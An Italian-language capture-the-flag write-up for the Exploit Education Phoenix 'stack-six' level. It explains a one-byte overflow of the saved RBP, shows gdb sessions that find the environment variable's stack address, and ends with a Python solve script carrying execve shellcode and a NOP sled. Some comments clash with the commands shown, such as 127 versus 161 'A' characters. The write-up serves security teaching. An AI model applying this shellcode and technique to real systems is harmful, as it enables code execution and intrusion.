### Descrizione del Codice

Il programma `stack_six.c` presenta una vulnerabilità di overflow del buffer che può essere sfruttata per modificare l'esecuzione del programma.

### Funzionamento del Programma

1. Il programma legge la variabile d'ambiente `ExploitEducation` e la passa alla funzione `greet` nella variabile `who`.
2. La funzione `greet` copia il messaggio di benvenuto `GREET` nel buffer.
3. Controlla la dimensione dell'input e copia l'input nel buffer.
4. Restituisce una stringa duplicata del buffer.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'overflow del buffer di 1 byte, che può essere sfruttato per sovrascrivere il byte più basso del puntatore base salvato (RBP) e reindirizzare l'esecuzione del codice.

### Exploit

L'exploit sfrutta l'overflow del buffer per sovrascrivere il byte più basso del puntatore base salvato (RBP) e reindirizzare l'esecuzione del codice a una shellcode.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ export ExploitEducation=$(python -c "print 'A'*161")  # Riempie la variabile d'ambiente ExploitEducation con 127 'A'

$ gdb -q /opt/phoenix/amd64/stack-six 
Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.

gef➤  disassemble greet 
Dump of assembler code for function greet:
.....
   0x000000000040077a <+125>:	mov    rdi,rcx
   0x000000000040077d <+128>:	call   0x400550 <strncpy@plt>
   0x0000000000400782 <+133>:	lea    rax,[rbp-0xa0]  # indirizzo di who
   0x0000000000400789 <+140>:	mov    rdi,rax
   0x000000000040078c <+143>:	call   0x400560 <strdup@plt>
.....

gef➤  b *0x0000000000400782
Breakpoint 1 at 0x400782

gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Breakpoint 1, 0x0000000000400782 in greet ()

gef➤  info registers rbp
rbp            0x7fffffffe590      0x7fffffffe590

gef➤  x/22xg $rbp-0xa0
0x7fffffffe510:	0x2c656d6f636c6557	0x6c70206d61204920
0x7fffffffe520:	0x6f74206465736165	0x6f79207465656d20
0x7fffffffe530:	0x4141414141412075	0x4141414141414141
0x7fffffffe540:	0x4141414141414141	0x4141414141414141
0x7fffffffe550:	0x4141414141414141	0x4141414141414141
0x7fffffffe560:	0x4141414141414141	0x4141414141414141
0x7fffffffe570:	0x4141414141414141	0x4141414141414141
0x7fffffffe580:	0x4141414141414141	0x4141414141414141
0x7fffffffe590:	0x4141414141414141	0x4141414141414141
0x7fffffffe5a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe5b0:	0x00007fffffffe541	0x00000000004007e9

Come puoi vedere, siamo riusciti a sovrascrivere solo il primo byte del puntatore base salvato (RBP).

L'idea dell'exploit è modificare RBP per puntare a un indirizzo in cui RBP+8 (che sarà l'indirizzo di ritorno di main) punti a un indirizzo nella variabile d'ambiente ExploitEducation.

Possiamo ottenere l'indirizzo di ExploitEducation utilizzando molti modi, come il dump dello stack fino a trovarlo (le variabili d'ambiente sono alla fine dello stack).

gef➤  grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef36  →   "ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"

Come puoi vedere, l'indirizzo del nostro input inizia a 0x7fffffffeeff, ma abbiamo bisogno dell'inizio dell'input, quindi l'inizio reale è 0x7fffffffeeff + len("ExploitEducation=") = 0x7fffffffef10.

Quindi l'indirizzo di ritorno deve puntare a un indirizzo compreso tra 0x7fffffffef10 e 0x7fffffffef10+126.

Poiché possiamo solo cambiare l'ultimo byte di RBP, il suo valore può essere compreso tra 0x7fffffffe501 e 0x7fffffffe5ff. Mettiamo un breakpoint alla fine di main e vediamo se c'è un buon indirizzo a cui possiamo saltare in questo intervallo.

gef➤  disassemble main 
Dump of assembler code for function main:
   0x00000000004007e4 <+73>:	call   0x4006fd <greet>
   0x00000000004007e9 <+78>:	mov    rdi,rax
   0x00000000004007ec <+81>:	call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:	mov    eax,0x0
   0x00000000004007f6 <+91>:	leave

gef➤  b *0x00000000004007f6
Breakpoint 2 at 0x4007f6

gef➤  r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Breakpoint 1, 0x00000000004007f6 in main ()

gef➤  x/32xg 0x7fffffffe500
0x7fffffffe500:	0x00007ffff7ffc948	0x00000000000000a6
0x7fffffffe510:	0x0000000000000001	0x00007ffff7db6d0f
0x7fffffffe520:	0x00007ffff7ffc948	0x00000000000000a6
0x7fffffffe530:	0x00007fffffffe58f	0x0000000000000001
0x7fffffffe540:	0x4141414141414141	0x00007ffff7ffb300
0x7fffffffe550:	0x0000000000000000	0x0000000000600c00
0x7fffffffe560:	0x000000000040079b	0x0000000000000000
0x7fffffffe570:	0x0000000000000000	0x00007ffff7db6b1e
0x7fffffffe580:	0x00007ffff7ffb300	0x0a00000000000000
0x7fffffffe590:	0x00007ffff7ffb300	0x00007ffff7db9934
0x7fffffffe5a0:	0x4141414141414141	0x00007fffffffe541
0x7fffffffe5b0:	0x00007fffffffe648	0x00000000004007f1
0x7fffffffe5c0:	0x00007fffffffe638	0x00000001ffffe648
0x7fffffffe5d0:	0x000000000040079b	0x00007fffffffef10
0x7fffffffe5e0:	0x0000000000000001	0x00007ffff7d8fd62
0x7fffffffe5f0:	0x0000000000000000	0x00007fffffffe630

E voilà! Otteniamo 0x00007fffffffef10 all'indirizzo 0x7fffffffe5d8, quindi sovrascriviamo RBP per essere 0x7fffffffe5d0 e il gioco è fatto. L'istruzione leave sposterà RBP in RSP e popperà il valore superiore dello stack in RBP (che è a 0x7fffffffe5d0), quindi il ret popperà il valore successivo in RIP (che è a 0x7fffffffe5d8).

Quindi l'idea generale era di sovrascrivere RBP per puntare a un indirizzo in cui RBP+8 è l'indirizzo della nostra shellcode, in modo che alla fine della funzione chiamante il valore di RIP punti a quell'indirizzo.

Soluzione

# solve.py

from pwn import *

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

buff = ""
buff += '\x90' * 20  # un po' di NOP sled è sempre utile :)
buff += shellcode
buff += 'A' * (126 - len(buff))
buff += '\xd0'

print(buff)

Eseguiamo lo script:
$ export ExploitEducation=$(python solve.py)
$ /opt/phoenix/amd64/stack-six